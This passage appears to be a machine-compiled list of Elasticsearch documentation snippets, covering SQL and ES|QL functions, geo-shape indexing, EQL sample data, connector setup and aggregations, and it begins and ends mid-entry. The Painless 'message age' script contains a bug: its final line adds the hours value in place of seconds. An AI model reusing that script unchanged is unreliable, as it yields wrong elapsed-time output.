\"now-10M/M\" },\n          { \"from\": \"now-10M/M\" }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LTRIM Function in Elasticsearch SQL\nDESCRIPTION: Returns the characters of a string expression with leading blanks removed. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nLTRIM(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LTRIM('   Elastic');\n\nLTRIM('   Elastic')\n-------------------\nElastic\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON MultiLineString in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON MultiLineString geometry in Elasticsearch. MultiLineString represents a collection of linestrings as an array of linestring coordinate arrays.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"MultiLineString\",\n    \"coordinates\" : [\n      [ [102.0, 2.0], [103.0, 2.0], [103.0, 3.0], [102.0, 3.0] ],\n      [ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0] ],\n      [ [100.2, 0.2], [100.8, 0.2], [100.8, 0.8], [100.2, 0.8] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Authentication Failed Event Logging in Elasticsearch\nDESCRIPTION: JSON structure for logging failed authentication attempts where credentials don't match known users.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:10:15,510+0200\", \"node.id\":\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"rest\", \"event.action\":\"authentication_failed\", \"user.name\":\"elastic\", \"origin.type\":\"rest\", \"origin.address\":\"[::1]:51504\", \"url.path\":\"/_security/user/user1\", \"url.query\":\"pretty\", \"request.method\":\"POST\", \"request.id\":\"POv8p_qeTl2tb5xoFl0HIg\"}\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Sine in SQL\nDESCRIPTION: The SINH function calculates the hyperbolic sine of a numeric expression. It requires one numeric input and returns a double numeric value. If the input is null, the function delivers null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_48\n\nLANGUAGE: sql\nCODE:\n```\nSINH(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Defining Greek Stop Words\nDESCRIPTION: Defines the Greek stop words applicable in Elasticsearch analysis, with a link to the corresponding Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_21\n\nLANGUAGE: markdown\nCODE:\n```\n`_greek_`\n:   [Greek stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/el/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Setting Translog Durability in Elasticsearch YAML\nDESCRIPTION: Configures whether to fsync and commit the translog after every request or asynchronously. 'request' ensures all acknowledged writes are committed to disk, while 'async' commits in the background every sync_interval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/translog.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nindex.translog.durability: request\n```\n\n----------------------------------------\n\nTITLE: Inserting Sample Data into Elasticsearch Indices\nDESCRIPTION: This snippet demonstrates how to insert sample data into the three previously created indices using the bulk API. The data includes various event types with different field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"@timestamp\":\"1234567891\",\"@timestamp_pretty\":\"12-12-2022\",\"missing_keyword\":\"test\",\"type_test\":\"abc\",\"ip\":\"10.0.0.1\",\"event_type\":\"alert\",\"host\":\"doom\",\"uptime\":0,\"port\":1234,\"os\":\"win10\",\"version\":\"1.0.0\",\"id\":11}\n{\"index\":{\"_id\":2}}\n{\"@timestamp\":\"1234567892\",\"@timestamp_pretty\":\"13-12-2022\",\"event_type\":\"alert\",\"type_test\":\"abc\",\"host\":\"CS\",\"uptime\":5,\"port\":1,\"os\":\"win10\",\"version\":\"1.2.0\",\"id\":12}\n{\"index\":{\"_id\":3}}\n{\"@timestamp\":\"1234567893\",\"@timestamp_pretty\":\"12-12-2022\",\"event_type\":\"alert\",\"type_test\":\"abc\",\"host\":\"farcry\",\"uptime\":1,\"port\":1234,\"bool\":false,\"os\":\"win10\",\"version\":\"2.0.0\",\"id\":13}\n{\"index\":{\"_id\":4}}\n{\"@timestamp\":\"1234567894\",\"@timestamp_pretty\":\"13-12-2022\",\"event_type\":\"alert\",\"type_test\":\"abc\",\"host\":\"GTA\",\"uptime\":3,\"port\":12,\"os\":\"slack\",\"version\":\"10.0.0\",\"id\":14}\n{\"index\":{\"_id\":5}}\n{\"@timestamp\":\"1234567895\",\"@timestamp_pretty\":\"17-12-2022\",\"event_type\":\"alert\",\"host\":\"sniper 3d\",\"uptime\":6,\"port\":1234,\"os\":\"fedora\",\"version\":\"20.1.0\",\"id\":15}\n{\"index\":{\"_id\":6}}\n{\"@timestamp\":\"1234568896\",\"@timestamp_pretty\":\"17-12-2022\",\"event_type\":\"alert\",\"host\":\"doom\",\"port\":65123,\"bool\":true,\"os\":\"redhat\",\"version\":\"20.10.0\",\"id\":16}\n{\"index\":{\"_id\":7}}\n{\"@timestamp\":\"1234567897\",\"@timestamp_pretty\":\"17-12-2022\",\"missing_keyword\":\"yyy\",\"event_type\":\"failure\",\"host\":\"doom\",\"uptime\":15,\"port\":1234,\"bool\":true,\"os\":\"redhat\",\"version\":\"20.2.0\",\"id\":17}\n{\"index\":{\"_id\":8}}\n{\"@timestamp\":\"1234567898\",\"@timestamp_pretty\":\"12-12-2022\",\"missing_keyword\":\"test\",\"event_type\":\"success\",\"host\":\"doom\",\"uptime\":16,\"port\":512,\"os\":\"win10\",\"version\":\"1.2.3\",\"id\":18}\n{\"index\":{\"_id\":9}}\n{\"@timestamp\":\"1234567899\",\"@timestamp_pretty\":\"15-12-2022\",\"missing_keyword\":\"test\",\"event_type\":\"success\",\"host\":\"GTA\",\"port\":12,\"bool\":true,\"os\":\"win10\",\"version\":\"1.2.3\",\"id\":19}\n{\"index\":{\"_id\":10}}\n{\"@timestamp\":\"1234567893\",\"missing_keyword\":null,\"ip\":\"10.0.0.5\",\"event_type\":\"alert\",\"host\":\"farcry\",\"uptime\":1,\"port\":1234,\"bool\":true,\"os\":\"win10\",\"version\":\"1.2.3\",\"id\":110}\n\nPOST /my-index-000002/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"@timestamp\":\"1234567991\",\"type_test\":\"abc\",\"ip\":\"10.0.0.1\",\"event_type\":\"alert\",\"host\":\"doom\",\"uptime\":0,\"port\":1234,\"op_sys\":\"win10\",\"id\":21}\n{\"index\":{\"_id\":2}}\n{\"@timestamp\":\"1234567992\",\"type_test\":\"abc\",\"event_type\":\"alert\",\"host\":\"CS\",\"uptime\":5,\"port\":1,\"op_sys\":\"win10\",\"id\":22}\n{\"index\":{\"_id\":3}}\n{\"@timestamp\":\"1234567993\",\"type_test\":\"abc\",\"@timestamp_pretty\":\"2022-12-17\",\"event_type\":\"alert\",\"host\":\"farcry\",\"uptime\":1,\"port\":1234,\"bool\":false,\"op_sys\":\"win10\",\"id\":23}\n{\"index\":{\"_id\":4}}\n{\"@timestamp\":\"1234567994\",\"event_type\":\"alert\",\"host\":\"GTA\",\"uptime\":3,\"port\":12,\"op_sys\":\"slack\",\"id\":24}\n{\"index\":{\"_id\":5}}\n{\"@timestamp\":\"1234567995\",\"event_type\":\"alert\",\"host\":\"sniper 3d\",\"uptime\":6,\"port\":1234,\"op_sys\":\"fedora\",\"id\":25}\n{\"index\":{\"_id\":6}}\n{\"@timestamp\":\"1234568996\",\"@timestamp_pretty\":\"2022-12-17\",\"ip\":\"10.0.0.5\",\"event_type\":\"alert\",\"host\":\"doom\",\"port\":65123,\"bool\":true,\"op_sys\":\"redhat\",\"id\":26}\n{\"index\":{\"_id\":7}}\n{\"@timestamp\":\"1234567997\",\"@timestamp_pretty\":\"2022-12-17\",\"event_type\":\"failure\",\"host\":\"doom\",\"uptime\":15,\"port\":1234,\"bool\":true,\"op_sys\":\"redhat\",\"id\":27}\n{\"index\":{\"_id\":8}}\n{\"@timestamp\":\"1234567998\",\"ip\":\"10.0.0.1\",\"event_type\":\"success\",\"host\":\"doom\",\"uptime\":16,\"port\":512,\"op_sys\":\"win10\",\"id\":28}\n{\"index\":{\"_id\":9}}\n{\"@timestamp\":\"1234567999\",\"ip\":\"10.0.0.1\",\"event_type\":\"success\",\"host\":\"GTA\",\"port\":12,\"bool\":false,\"op_sys\":\"win10\",\"id\":29}\n\nPOST /my-index-000003/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"@timestamp\":\"1334567891\",\"host_ip\":\"10.0.0.1\",\"event_type\":\"alert\",\"host\":\"doom\",\"uptime\":0,\"port\":12,\"os\":\"win10\",\"id\":31}\n{\"index\":{\"_id\":2}}\n{\"@timestamp\":\"1334567892\",\"event_type\":\"alert\",\"host\":\"CS\",\"os\":\"win10\",\"id\":32}\n{\"index\":{\"_id\":3}}\n{\"@timestamp\":\"1334567893\",\"event_type\":\"alert\",\"host\":\"farcry\",\"bool\":true,\"os\":\"win10\",\"id\":33}\n{\"index\":{\"_id\":4}}\n{\"@timestamp\":\"1334567894\",\"event_type\":\"alert\",\"host\":\"GTA\",\"os\":\"slack\",\"bool\":true,\"id\":34}\n{\"index\":{\"_id\":5}}\n{\"@timestamp\":\"1234567895\",\"event_type\":\"alert\",\"host\":\"sniper 3d\",\"os\":\"fedora\",\"id\":35}\n{\"index\":{\"_id\":6}}\n{\"@timestamp\":\"1234578896\",\"host_ip\":\"10.0.0.1\",\"event_type\":\"alert\",\"host\":\"doom\",\"bool\":true,\"os\":\"redhat\",\"id\":36}\n{\"index\":{\"_id\":7}}\n{\"@timestamp\":\"1234567897\",\"event_type\":\"failure\",\"missing_keyword\":\"test\",\"host\":\"doom\",\"bool\":true,\"os\":\"redhat\",\"id\":37}\n{\"index\":{\"_id\":8}}\n{\"@timestamp\":\"1234577898\",\"event_type\":\"success\",\"host\":\"doom\",\"os\":\"win10\",\"id\":38,\"date\":\"1671235200000\"}\n{\"index\":{\"_id\":9}}\n{\"@timestamp\":\"1234577899\",\"host_ip\":\"10.0.0.5\",\"event_type\":\"success\",\"host\":\"GTA\",\"bool\":true,\"os\":\"win10\",\"id\":39}\n```\n\n----------------------------------------\n\nTITLE: Completion Suggester Response in Elasticsearch\nDESCRIPTION: Shows the response format of a completion suggester query, including metadata fields and the suggestion results with their scores and source documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_13\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\": ...\n  \"took\": 2,\n  \"timed_out\": false,\n  \"suggest\": {\n    \"song-suggest\" : [ {\n      \"text\" : \"nir\",\n      \"offset\" : 0,\n      \"length\" : 3,\n      \"options\" : [ {\n        \"text\" : \"Nirvana\",\n        \"_index\": \"music\",\n        \"_id\": \"1\",\n        \"_score\": 1.0,\n        \"_source\": {\n          \"suggest\": [\"Nevermind\", \"Nirvana\"]\n        }\n      } ]\n    } ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including CATEGORIZE Function Documentation in Markdown\nDESCRIPTION: This snippet includes documentation for the CATEGORIZE function from an external markdown file, with a note about license requirements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/functions-operators/grouping-functions.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{note} \nThe `CATEGORIZE` function requires a [platinum license](https://www.elastic.co/subscriptions).\n:::\n\n:::{include} ../_snippets/functions/layout/categorize.md\n:::\n```\n\n----------------------------------------\n\nTITLE: SQL Query for MAX Aggregation\nDESCRIPTION: This SQL query selects the maximum value of the keyword field from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_27\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT MAX(keyword) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Example of ACOS Function Usage\nDESCRIPTION: Demonstrates that ACOS and COS are inverse functions by showing that ACOS(COS(PI())) equals PI().\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_36\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ACOS(COS(PI())), PI();\n\n ACOS(COS(PI())) |      PI()\n-----------------+-----------------\n3.141592653589793|3.141592653589793\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Microsoft Teams Connector - Shell\nDESCRIPTION: This shell command runs the Docker image for the Microsoft Teams connector service. It specifies volume mounts and network settings necessary for operating the connector with the relevant configuration file. Successful execution starts the connector service with the provided configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-teams.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Including MV_MIN Function Examples in Markdown\nDESCRIPTION: This snippet includes examples of using the MV_MIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_min.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/mv_min.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Setting JVM Options for elasticsearch-reconfigure-node Tool\nDESCRIPTION: Demonstrates how to set custom JVM options for the elasticsearch-reconfigure-node tool by using the CLI_JAVA_OPTS environment variable. This example increases the heap size to 1GB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reconfigure-node.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nexport CLI_JAVA_OPTS=\"-Xmx1g\"\nbin/elasticsearch-reconfigure-node ...\n```\n\n----------------------------------------\n\nTITLE: Synopsis of elasticsearch-syskeygen Command in Shell\nDESCRIPTION: The synopsis shows the basic structure and available options for the elasticsearch-syskeygen command. It includes options for configuring settings, getting help, and controlling output verbosity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/syskeygen.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-syskeygen\n[-E <KeyValuePair>] [-h, --help]\n([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Copying to Nested Fields with Full Path Specification in Elasticsearch\nDESCRIPTION: This example shows how to correctly use copy_to with nested fields in Elasticsearch. When targeting nested fields, the full path must be specified to avoid mapping exceptions, particularly important when using strict dynamic mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/copy-to.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /test_index\n{\n  \"mappings\": {\n    \"dynamic\": \"strict\",\n    \"properties\": {\n      \"description\": {\n        \"properties\": {\n          \"notes\": {\n            \"type\": \"text\",\n            \"copy_to\": [ \"description.notes_raw\"],\n            \"analyzer\": \"standard\",\n            \"search_analyzer\": \"standard\"\n          },\n          \"notes_raw\": {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Mapping Table\nDESCRIPTION: Markdown table showing the mapping between field types and their corresponding result types in ESQL. This is auto-generated content from AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/neg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| date_period | date_period |\n| double | double |\n| integer | integer |\n| long | long |\n| time_duration | time_duration |\n```\n\n----------------------------------------\n\nTITLE: Clearing All Scroll Contexts in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to clear all scroll contexts using the _all parameter with the clear-scroll API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_search/scroll/_all\n```\n\n----------------------------------------\n\nTITLE: Defining LocalDateTime Class\nDESCRIPTION: This code snippet outlines the `java.time.LocalDateTime` class, listing methods for working with date and time values without timezone information. It provides methods for creation, manipulation, extraction of date/time components, and conversions to other time types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.LocalDateTime {\\n  LocalDateTime MIN\\n  LocalDateTime MAX\\n  OffsetDateTime atOffset(ZoneOffset)\\n  ZonedDateTime atZone(ZoneId)\\n  LocalDateTime from(TemporalAccessor)\\n  int getDayOfMonth()\\n  DayOfWeek getDayOfWeek()\\n  int getDayOfYear()\\n  int getHour()\\n  int getMinute()\\n  Month getMonth()\\n  int getMonthValue()\\n  int getNano()\\n  int getSecond()\\n  int getYear()\\n  LocalDateTime minus(TemporalAmount)\\n  LocalDateTime minus(long,TemporalUnit)\\n  LocalDateTime minusDays(long)\\n  LocalDateTime minusHours(long)\\n  LocalDateTime minusMinutes(long)\\n  LocalDateTime minusMonths(long)\\n  LocalDateTime minusNanos(long)\\n  LocalDateTime minusSeconds(long)\\n  LocalDateTime minusWeeks(long)\\n  LocalDateTime minusYears(long)\\n  LocalDateTime of(LocalDate,LocalTime)\\n  LocalDateTime of(int,int,int,int,int)\\n  LocalDateTime of(int,int,int,int,int,int)\\n  LocalDateTime of(int,int,int,int,int,int,int)\\n  LocalDateTime ofInstant(Instant,ZoneId)\\n  LocalDateTime ofEpochSecond(long,int,ZoneOffset)\\n  LocalDateTime parse(CharSequence)\\n  LocalDateTime parse(CharSequence,DateTimeFormatter)\\n  LocalDateTime plus(TemporalAmount)\\n  LocalDateTime plus(long,TemporalUnit)\\n  LocalDateTime plusDays(long)\\n  LocalDateTime plusHours(long)\\n  LocalDateTime plusMinutes(long)\\n  LocalDateTime plusMonths(long)\\n  LocalDateTime plusNanos(long)\\n  LocalDateTime plusSeconds(long)\\n  LocalDateTime plusWeeks(long)\\n  LocalDateTime plusYears(long)\\n  LocalDate toLocalDate()\\n  LocalDateTime truncatedTo(TemporalUnit)\\n  LocalDateTime with(TemporalAdjuster)\\n  LocalDateTime with(TemporalField,long)\\n  LocalDateTime withDayOfMonth(int)\\n  LocalDateTime withDayOfYear(int)\\n  LocalDateTime withHour(int)\\n  LocalDateTime withMinute(int)\\n  LocalDateTime withMonth(int)\\n  LocalDateTime withSecond(int)\\n  LocalDateTime withYear(int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Rare Terms Aggregation\nDESCRIPTION: Demonstrates how to handle documents with missing values in rare terms aggregation by specifying a default value 'N/A'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"rare_terms\": {\n        \"field\": \"genre\",\n        \"missing\": \"N/A\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Geometry to WKT with ST_AsWKT in Elasticsearch SQL\nDESCRIPTION: Converts a geometry to its WKT (Well-Known Text) representation. This function takes a geometry as input and returns a string containing the WKT representation of that geometry.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nST_AsWKT(\n    geometry <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT city, ST_AsWKT(location) location FROM \"geo\" WHERE city = 'Amsterdam';\n\n     city:s    |     location:s\nAmsterdam      |POINT (4.850312 52.347557)\n```\n\n----------------------------------------\n\nTITLE: Calculating Message Age in Painless Script\nDESCRIPTION: This Painless script is used within Elasticsearch to calculate and return the age of a message. It determines the elapsed time between 'now' and a message timestamp in years, months, days, hours, minutes, and seconds. The inputs include a parameter for the current time and expect an Elasticsearch document with a 'datetime' field. The script processes each unit of time until it reaches the level of seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_32\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime now = ZonedDateTime.ofInstant(\n        Instant.ofEpochMilli(params['now']), ZoneId.of('Z')); <1>\nZonedDateTime mdt = doc['datetime'].value; <2>\n\nString age;\n\nlong years = mdt.until(now, ChronoUnit.YEARS); <3>\nage = years + 'Y '; <4>\nmdt = mdt.plusYears(years); <5>\n\nlong months = mdt.until(now, ChronoUnit.MONTHS);\nage += months + 'M ';\nmdt = mdt.plusMonths(months);\n\nlong days = mdt.until(now, ChronoUnit.DAYS);\nage += days + 'D ';\nmdt = mdt.plusDays(days);\n\nlong hours = mdt.until(now, ChronoUnit.HOURS);\nage += hours + 'h ';\nmdt = mdt.plusHours(hours);\n\nlong minutes = mdt.until(now, ChronoUnit.MINUTES);\nage += minutes + 'm ';\nmdt = mdt.plusMinutes(minutes);\n\nlong seconds = mdt.until(now, ChronoUnit.SECONDS);\nage += hours + 's';\n\nreturn age; <6>\n```\n\n----------------------------------------\n\nTITLE: GeoTile Grid Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates how to use geotile_grid aggregation on geo_point fields to group points into map tile buckets with specified precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"tile\": { \"geotile_grid\": { \"field\": \"location\", \"precision\": 8 } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Strip Character Filter in Elasticsearch\nDESCRIPTION: Removes HTML elements and decodes HTML entities from text streams during text analysis preprocessing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/character-filter-reference.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`html_strip` character filter strips out HTML elements like `<b>` and decodes HTML entities like `&amp;`\n```\n\n----------------------------------------\n\nTITLE: Filtered Significant Text Aggregation Results in Elasticsearch\nDESCRIPTION: This snippet shows the improved results of a significant_text aggregation after applying the filter_duplicate_text setting, demonstrating more relevant keywords related to Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"sample\": {\n      \"doc_count\": 35,\n      \"keywords\": {\n        \"doc_count\": 35,\n        \"buckets\": [\n          {\n            \"key\": \"elasticsearch\",\n            \"doc_count\": 22,\n            \"score\": 11288.001166180758,\n            \"bg_count\": 35\n          },\n          {\n            \"key\": \"logstash\",\n            \"doc_count\": 3,\n            \"score\": 1836.648979591837,\n            \"bg_count\": 4\n          },\n          {\n            \"key\": \"kibana\",\n            \"doc_count\": 3,\n            \"score\": 1469.3020408163263,\n            \"bg_count\": 5\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Gmail Connector via Elasticsearch API\nDESCRIPTION: API call to create a new Gmail connector in Elasticsearch with basic configuration settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-gmail.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-gmail-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Gmail\",\n  \"service_type\": \"gmail\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Routing Path in Elasticsearch\nDESCRIPTION: Setting to specify keyword fields used for routing documents to index shards in a TSDS.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nindex.routing_path: [\"field1\", \"field2\"]\n```\n\n----------------------------------------\n\nTITLE: Indexing a LineString Geometry using WKT in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a LineString geometry specified in Well-Known Text (WKT) format. The line is defined by two points representing a path from the White House to the US Capitol Building.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"LINESTRING (-77.03653 38.897676, -77.009051 38.889939)\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Missing Configuration Fields to Elasticsearch Connector\nDESCRIPTION: This snippet shows how to manually add missing configuration fields to a connector that was created prior to version 8.8, resolving potential errors in the self-managed connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-known-issues.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /.elastic-connectors/_update/connector_id\n{\n  \"doc\" : {\n    \"configuration\": {\n      \"field_a\": {\n        \"type\": \"str\",\n        \"value\": \"\"\n      },\n      \"field_b\": {\n        \"type\": \"bool\",\n        \"value\": false\n      },\n      \"field_c\": {\n        \"type\": \"int\",\n        \"value\": 1\n      },\n      \"field_d\": {\n        \"type\": \"list\",\n        \"value\": \"a,b\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Elision Filter in Elasticsearch\nDESCRIPTION: Example of using the analyze API with the elision filter to remove the elision 'j'' from French text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-elision-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"elision\"],\n  \"text\" : \"j'examine près du wharf\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ examine, près, du, wharf ]\n```\n\n----------------------------------------\n\nTITLE: Indexing All Connected Pages and Databases - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet indexes all pages and databases associated with a Notion workspace, allowing for comprehensive data indexing without specific queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\":[\n    {\n      \"query\":\"\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Verifying Connector Connection\nDESCRIPTION: Retrieves the status of a specified Elasticsearch connector instance using an API call. The response format should contain a `needs_configuration` status and a `last_seen` field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nGET _connector/my-connector-id\n```\n\n----------------------------------------\n\nTITLE: Basic IP Range Aggregation Query\nDESCRIPTION: Demonstrates how to perform a basic IP range aggregation query using 'to' and 'from' range parameters on an IP field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-iprange-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /ip_addresses/_search\n{\n  \"size\": 10,\n  \"aggs\": {\n    \"ip_ranges\": {\n      \"ip_range\": {\n        \"field\": \"ip\",\n        \"ranges\": [\n          { \"to\": \"10.0.0.5\" },\n          { \"from\": \"10.0.0.5\" }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Numeric Sign using SIGNUM in ESQL\nDESCRIPTION: Demonstrates how to use the SIGNUM function to determine the sign of a numeric value. Returns -1 for negative numbers, 0 for zero, and 1 for positive numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/signum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 100.0\n| EVAL s = SIGNUM(d)\n```\n\n----------------------------------------\n\nTITLE: Conditional Reroute Processor Configuration\nDESCRIPTION: Example configuration of a reroute processor with a conditional statement for nginx log files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/reroute-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: 